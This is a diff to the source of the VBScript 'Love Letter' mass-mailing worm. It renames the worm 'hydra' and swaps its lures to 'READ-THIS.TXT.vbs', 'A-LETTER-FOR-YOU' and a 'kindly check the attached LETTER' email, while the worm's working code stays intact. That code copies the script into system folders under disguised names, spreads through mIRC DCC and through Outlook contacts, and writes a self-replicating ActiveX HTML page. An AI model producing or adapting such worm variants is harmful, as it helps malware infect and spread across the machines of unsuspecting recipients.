@@ -1,4 +1,4 @@
-em  barok -h1zard(vbe) <i hate go to school>
+em  barok -hydra(vbe) <i hate go to school>
 rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
 On Error Resume Next
 
@@ -39,10 +39,10 @@ Sub main()
   Set c = fso.GetFile(WScript.ScriptFullName)
 
   rem Copy itself into VBScript files MSKernel32.vbs, Win32DLL.vbs and
-  rem H1ZARD-ON-TOP.TXT.vbs
+  rem READ-THIS.TXT.vbs
   c.Copy(dirsystem & "\MSKernel32.vbs")
   c.Copy(dirwin & "\Win32DLL.vbs")
-  c.Copy(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
+  c.Copy(dirsystem & "\READ-THIS.TXT.vbs")
 
   rem Call the other subroutines.
   regruns()
@@ -194,7 +194,7 @@ Sub infectfiles(folderspec)
         Set scriptini = fso.CreateTextFile(folderspec & "\script.ini")
         rem The following mIRC script checks if the "nick" of a user is the same
         rem as "me" to halt and send a DCC command that will send a message to
-        rem the user with a link to the LOVE=LETTER-FOR-YOU html page on the
+        rem the user with a link to the A=LETTER-FOR-YOU html page on the
         rem system.
         scriptini.WriteLine "[script]"
         scriptini.WriteLine ";mIRC Script"
@@ -206,7 +206,7 @@ Sub infectfiles(folderspec)
         scriptini.WriteLine ";"
         scriptini.WriteLine "n0=on 1:JOIN:#:{"
         scriptini.WriteLine "n1=  /If ( $nick == $me ) { halt }"
-        scriptini.WriteLine "n2=  /.dcc send $nick" & dirsystem & "\LOVE-LETTER-FOR-YOU.HTM"
+        scriptini.WriteLine "n2=  /.dcc send $nick" & dirsystem & "\A-LETTER-FOR-YOU.HTM"
         scriptini.WriteLine "n3=}"
         scriptini.close
 
@@ -288,7 +288,7 @@ Sub spreadtoemail()
   Set mapi = out.GetNameSpace("MAPI")
 
   rem Goes through all contacts in the address book and sends an email
-  rem with the LOVE-LETTER-FOR-YOU program as an attachment.
+  rem with the A-LETTER-FOR-YOU program as an attachment.
   For ctrlists = 1 To mapi.AddressLists.Count
     Set a = mapi.AddressLists(ctrlists)
     x = 1
@@ -310,14 +310,14 @@ Sub spreadtoemail()
 
         rem If the contact hasn't yet been sent an email, a new email will be
         rem composed with the virus attached and a "kind" message and the
-        rem subject "H1zardOnTopSayMad".
+        rem subject "hydra".
         If (regad = "") Then
           Set male = out.CreateItem(0)
 
           male.Recipients.Add(malead)
-          male.Subject = "H1zardOnTopSayMad"
-          male.Body = vbcrlf & "kindly check the attached LOVELETTER coming from me."
-          male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
+          male.Subject = "hydra"
+          male.Body = vbcrlf & "kindly check the attached LETTER coming from me."
+          male.Attachments.Add(dirsystem & "\READ-THIS.TXT.vbs")
           male.Send
 
           rem Sets the registry key to indicate that the email has been sent
@@ -338,7 +338,7 @@ Sub spreadtoemail()
   Set mapi = Nothing
 End Sub
 
-rem Subroutine to generate and create the HTML file for LOVE-LETTER-FOR-YOU.HTM.
+rem Subroutine to generate and create the HTML file for A-LETTER-FOR-YOU.HTM.
 Sub html
   On Error Resume Next
   Dim lines, n, dta1, dta2, dt1, dt2, dt3, dt4, l1, dt5, dt6
@@ -346,11 +346,11 @@ Sub html
   rem Generates an HTML page which contains a JScript and VBScript to replicate
   rem itself by leveraging ActiveX. It also listens for mouse and key events,
   rem which will open additional windows of the same page.
-  dta1 = "<HTML><HEAD><TITLE>h1zard- HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - h1zard@-@>"
+  dta1 = "<HTML><HEAD><TITLE>hydra- HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - hydra@-@>"
     & vbcrlf & _ "<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"
     & vbcrlf & _ "<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"
-    & vbcrlf & _ "<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "
-    & vbcrlf & _ "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"
+    & vbcrlf & _ "<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#A-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "
+    & vbcrlf & _ "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#A-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"
     & vbcrlf & _ "<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"
     & vbcrlf & _ "<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE>"
     & vbcrlf & _ "<?-?BODY><?-?HTML>"
@@ -421,12 +421,12 @@ Sub html
     End If
   Next
 
-  rem Create the LOVE-LETTER-FOR-YOU.HTM file in the system directory.
-  Set b = fso.CreateTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM")
+  rem Create the A-LETTER-FOR-YOU.HTM file in the system directory.
+  Set b = fso.CreateTextFile(dirsystem + "\A-LETTER-FOR-YOU.HTM")
   b.close
 
   rem Creates the HTM file from everything above.
-  Set d = fso.OpenTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM", 2)
+  Set d = fso.OpenTextFile(dirsystem + "\A-LETTER-FOR-YOU.HTM", 2)
   d.write dt5
   d.write join(lines, vbcrlf)
   d.write vbcrlf
